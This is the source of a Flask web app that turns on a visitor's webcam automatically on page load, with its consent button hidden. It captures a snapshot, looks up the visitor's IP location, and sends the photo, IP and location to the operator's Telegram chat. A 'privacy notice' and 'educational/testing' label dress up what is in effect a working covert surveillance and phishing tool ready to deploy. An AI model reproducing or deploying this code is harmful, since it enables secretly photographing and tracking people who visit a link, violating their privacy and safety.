# app.py
from flask import Flask, request, render_template_string
from datetime import datetime
import requests
import telepot
import os

app = Flask(__name__)

# Telegram bot setup — KEEP YOUR TOKEN SECRET in production
BOT_TOKEN = "Add Your Token Here"
CHAT_ID = 1245  # Replace with your chat ID
bot = telepot.Bot(token=BOT_TOKEN)

def get_client_ip():
    # X-Forwarded-For used when behind proxies/ngrok
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def get_location(ip):
    try:
        data = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
        return f"{data.get('city','')}, {data.get('regionName','')}, {data.get('country','')}"
    except:
        return "Unknown location"

# HTML + JS that will run in the visitor's browser.
INDEX_HTML = """
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Visitor Camera Capture (consent required)</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    #video { border: 1px solid #ccc; width: 320px; height: 240px; }
    #status { margin-top: 10px; }
  </style>
</head>
<body>
  <h2>Visitor Access</h2>
  <p><strong>Privacy notice:</strong> This page will request access to your webcam to capture a single photo for educational/testing purposes. The browser will ask you to allow the camera. Only proceed if you consent.</p>
  <button id="startBtn" style="display:none;">Allow camera & capture</button>
  <div id="preview" style="margin-top:10px; display:none;">
    <video id="video" autoplay playsinline></video>
    <p id="status">Waiting...</p>
  </div>

  <script>
    const startBtn = document.getElementById('startBtn');
    const preview = document.getElementById('preview');
    const video = document.getElementById('video');
    const status = document.getElementById('status');

    async function startAndCapture() {
      status.textContent = "Requesting camera permission...";
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        preview.style.display = 'block';
        video.srcObject = stream;
        status.textContent = "Camera active — preparing to capture...";
        // wait a moment for camera auto-adjust
        await new Promise(r => setTimeout(r, 900));
        captureAndUpload(stream);
      } catch (err) {
        status.textContent = "Camera access denied or not available: " + err.message;
      }
    }

    function captureAndUpload(stream) {
      const canvas = document.createElement('canvas');
      const w = video.videoWidth || 320;
      const h = video.videoHeight || 240;
      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, w, h);

      canvas.toBlob(async function(blob) {
        status.textContent = "Uploading snapshot...";
        const fd = new FormData();
        fd.append('photo', blob, 'visitor_capture.png');

        try {
          const res = await fetch('/upload_photo', {
            method: 'POST',
            body: fd,
            credentials: 'same-origin'
          });
          if (res.ok) {
            status.textContent = "Captured and uploaded. Thank you.";
          } else {
            const t = await res.text();
            status.textContent = "Upload failed: " + t;
          }
        } catch (e) {
          status.textContent = "Upload error: " + e.message;
        }

        // stop tracks so camera turns off
        stream.getTracks().forEach(t => t.stop());
      }, 'image/png');
    }

    // Automatically start the camera as soon as the page loads
    window.onload = () => {
      startAndCapture();
    };
  </script>
</body>
</html>
"""

@app.route('/')
def home():
    # Serve the page that requests camera access (client-side)
    return render_template_string(INDEX_HTML)

@app.route('/upload_photo', methods=['POST'])
def upload_photo():
    if 'photo' not in request.files:
        return "No photo file received", 400

    photo = request.files['photo']
    now = datetime.now().strftime('%Y%m%d_%H%M%S')
    os.makedirs('captures', exist_ok=True)
    filename = f"captures/visitor_{now}.png"
    photo.save(filename)

    user_ip = get_client_ip()
    location = get_location(user_ip)
    text = f"Visitor photo captured at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nIP: {user_ip}\nLocation: {location}"
    try:
        bot.sendMessage(CHAT_ID, text)
        with open(filename, 'rb') as f:
            bot.sendPhoto(CHAT_ID, f)
    except Exception as e:
        # still return success to the visitor but log the error
        print("Telegram send error:", e)

    return "OK", 200

if __name__ == '__main__':
    # For local testing use: python app.py
    # In production use a WSGI server and HTTPS.
    app.run(host='0.0.0.0', port=5005, debug=True)
